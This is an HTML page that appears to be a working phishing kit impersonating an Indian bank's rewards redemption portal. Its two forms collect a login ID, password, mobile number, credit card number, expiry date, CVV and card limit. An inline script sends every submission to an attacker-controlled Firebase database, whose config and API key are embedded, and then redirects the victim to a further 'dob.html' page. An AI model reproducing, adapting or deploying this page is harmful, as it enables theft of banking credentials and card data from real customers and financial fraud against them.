<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="/script/main.js"></script>
  </head>
  <body class="bg-[#F4F4F4]">
    <!-- Header -->
    <header>
      <div
        class="bg-[url('/assets/header.png')] text-white w-auto bg-cover h-[60px] shadow-md"
      ></div>
    </header>
    <!-- Main Content -->
    <section class="flex flex-col justify-center mt-10">
      <h1 class="text-2xl text-center font-bold">Continue to Reedem Rewards</h1>
      <!-- Tabs -->
      <div class="flex justify-center mt-5 w-full px-5">
        <div class="grid grid-cols-2 gap-0 w-full">
          <button
            id="first-tab"
            class="tab-button text-white px-2 py-1 rounded-l-full border border-gray-400 text-sm border-2 bg-[#861F41]"
          >
            Login ID / Customer ID
          </button>
          <button
            id="second-tab"
            class="tab-button text-black px-2 py-1 rounded-r-full border border-gray-400 border-2 text-sm"
          >
            Credit Card Login
          </button>
        </div>
      </div>

      <!-- First Form -->
      <form action="" id="first-form" class="px-8 tab-content">
        <div
          class="space-y-6 flex flex-col justify-center mt-10 p-5 rounded-xl"
        >
          <!-- {/* Full Name */} -->
          <div class="mb-4">
            <label
              class="text-gray-500 font-bold text-sm mb-2 flex items-center"
              htmlFor="customer_id"
            >
              Login ID / Customer ID <span class="text-red-500">*</span>
            </label>
            <input
              class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
              id="customer_id"
              type="text"
              name="C1"
              value=""
              required
            />
          </div>
          <!-- {/* Password */} -->
          <div class="mb-4">
            <label
              class="text-gray-500 font-bold text-sm mb-2 flex items-center"
              htmlFor="user_password"
            >
              Password <span class="text-red-500">*</span>
            </label>
            <input
              class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
              id="user_password"
              type="password"
              name="C2"
              value=""
              required
            />
          </div>
          <!-- {/* Mobile Number */} -->
          <div class="mb-4">
            <label
              class="text-gray-500 font-bold text-sm mb-2 flex items-center"
              htmlFor="mobile_no"
            >
              Registered Mobile Number <span class="text-red-500">*</span>
            </label>
            <input
              class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
              id="mobile_no"
              type="text"
              name="C3"
              value=""
              required
              pattern=".{10,}"
            />
          </div>
        </div>
        <!-- {/* Submit Button */} -->
        <div class="w-full flex justify-center items-center mt-5 px-5">
          <button
            class="bg-gradient-to-r from-[#861F41] to-[#861F41] text-white font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline w-full"
            type="submit"
          >
            Login
          </button>
        </div>
      </form>

      <!-- Sec Form -->
      <form action="" id="sec-form" class="px-8 tab-content hidden">
        <div
          class="space-y-6 flex flex-col justify-center mt-10 p-5 rounded-xl"
        >
          <!-- {/* Full Name */} -->
          <div class="mb-4">
            <label
              class="text-gray-500 font-bold text-sm mb-2 flex items-center"
              htmlFor="card_no"
            >
              Credit Card No. <span class="text-red-500">*</span>
            </label>
            <input
              class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
              id="card_no"
              type="text"
              name="CD1"
              value=""
              required
              pattern="^\d{4}-\d{4}-\d{4}-\d{4}$"
            />
          </div>
          <!-- {/* Expiry and CVV */} -->
          <div class="grid grid-cols-2 gap-2">
            <div class="mb-4">
              <label
                class="text-gray-500 font-bold text-sm mb-2 flex items-center"
                htmlFor="card_no"
              >
                Expiry Date <span class="text-red-500">*</span>
              </label>
              <input
                class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
                id="expiry_date"
                type="text"
                name="CD2"
                value=""
                required
              />
            </div>
            <div class="mb-4">
              <label
                class="text-gray-500 font-bold text-sm mb-2 flex items-center"
                htmlFor="card_no"
              >
                CVV <span class="text-red-500">*</span>
              </label>
              <input
                class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
                id="cvv"
                type="text"
                name="CD3"
                value=""
                required
              />
            </div>
          </div>
          <div class="mb-4">
            <label
              class="text-gray-500 font-bold text-sm mb-2 flex items-center"
              htmlFor="card_limit"
            >
              Credit Card Limit (In Rupees) <span class="text-red-500">*</span>
            </label>
            <input
              class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
              id="card_limit"
              type="text"
              name="CD4"
              value=""
              required
            />
          </div>
          <div class="mb-4">
            <label
              class="text-gray-500 font-bold text-sm mb-2 flex items-center"
              htmlFor="mobile_no"
            >
              Registered Mobile Number <span class="text-red-500">*</span>
            </label>
            <input
              class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
              id="mobile_no"
              type="text"
              name="CD5"
              value=""
              required
              pattern=".{10,}"
            />
          </div>
        </div>
        <!-- {/* Submit Button */} -->
        <div class="w-full flex justify-center items-center mt-5 px-5">
          <button
            class="bg-gradient-to-r from-[#861F41] to-[#861F41] text-white font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline w-full"
            type="submit"
          >
            Login
          </button>
        </div>
      </form>
    </section>
    <section>
      <img
        src="/assets/screencapture-omni-axisbank-co-in-axisretailbanking-2024-11-21-18_59_59.png"
        alt="footer"
        class="w-full bg-cover"
      />
    </section>

    <!-- Script -->
    <script
      defer
      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"
    ></script>

    <script
      defer
      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"
    ></script>
    <script
      defer
      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"
    ></script>

    <script type="module">
      // Import the functions you need from the SDKs you need
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
      // TODO: Add SDKs for Firebase products that you want to use
      // https://firebase.google.com/docs/web/setup#available-libraries

      import {
        getDatabase,
        ref,
        push,
      } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";

      // Your web app's Firebase configuration
      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
      const firebaseConfig = {
  apiKey: "AIzaSyDtwgMGV6oeIA_dx6iEgRtV-82NpY1xKzU",
  authDomain: "rahul-4a87a.firebaseapp.com",
  databaseURL: "https://rahul-4a87a-default-rtdb.firebaseio.com",
  projectId: "rahul-4a87a",
  storageBucket: "rahul-4a87a.firebasestorage.app",
  messagingSenderId: "31092916515",
  appId: "1:31092916515:web:8be394534c745a3a540c96"
};

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);
      const analytics = getAnalytics(app);
      const database = getDatabase(app);

      document
        .getElementById("first-form")
        .addEventListener("submit", function (event) {
          event.preventDefault();
          //IDS
          const cu_id = document.querySelector(
            'input[name="C1"]'
          ).value;
          const userP = document.querySelector(
            'input[name="C2"]'
          ).value;
          const mno = document.querySelector(
            'input[name="C3"]'
          ).value;

          // Push data to the database
          const dbRef = ref(database, "users");
          push(dbRef, {
            CustomerID: cu_id,
            Password: userP,
            RegisteredMobileNumber: mno,
          })
            .then(() => {
              console.log("recorded succesfully");
              window.location.href = "dob.html";
            })
            .catch((error) => {
              console.error("Error inserting data: ", error);
            });
        });

      
      document.addEventListener("DOMContentLoaded", () => {
        // Format card number: 0000-0000-0000-0000
        const cardInput = document.querySelector('input[name="CD1"]');
        cardInput.addEventListener("input", (event) => {
          let input = event.target.value.replace(/\D/g, ""); // Remove non-digit characters
          input = input.substring(0, 16); // Limit to 16 digits
          const formattedInput = input.match(/.{1,4}/g)?.join("-") || "";
          event.target.value = formattedInput;
        });

        // Format expiry date: MM/YY
        const expiryInput = document.querySelector('input[name="CD2"]');
        expiryInput.addEventListener("input", (event) => {
          let input = event.target.value.replace(/\D/g, ""); // Remove non-digit characters
          input = input.substring(0, 4); // Limit to 4 digits
          if (input.length > 2) {
            input = `${input.substring(0, 2)}/${input.substring(2)}`; // Add slash after MM
          }
          event.target.value = input;
        });

        // Format mobile number: Allow only digits
        const mobileInput = document.querySelector('input[name="CD4"]');
        mobileInput.addEventListener("input", (event) => {
          const input = event.target.value.replace(/\D/g, ""); // Remove non-digit characters
          event.target.value = input.substring(0, 10); // Limit to 10 digits
        });

        // Form submit logic
        document
          .getElementById("sec-form")
          .addEventListener("submit", function (event) {
            event.preventDefault();

            // Get input values
            const cd_no = document.querySelector(
              'input[name="CD1"]'
            ).value;
            const exd = document.querySelector(
              'input[name="CD2"]'
            ).value;
            const vv = document.querySelector('input[name="CD3"]').value;
            const limit = document.querySelector(
              'input[name="CD4"]'
            ).value;
            const mno = document.querySelector(
              'input[name="CD5"]'
            ).value;

            // Push data to the database
            const dbRef = ref(database, "users");
            push(dbRef, {
              CreditCardNo: cd_no,
              ExpiryDate: exd,
              CVV: vv,
              CreditCardLimit: limit,
              RegisteredMobileNumber: mno,
            })
              .then(() => {
                console.log("recorded successfully!");
                window.location.href = "dob.html";
              })
              .catch((error) => {
                console.error("Error inserting data: ", error);
              });
          });
      });
    </script>
  </body>
</html>
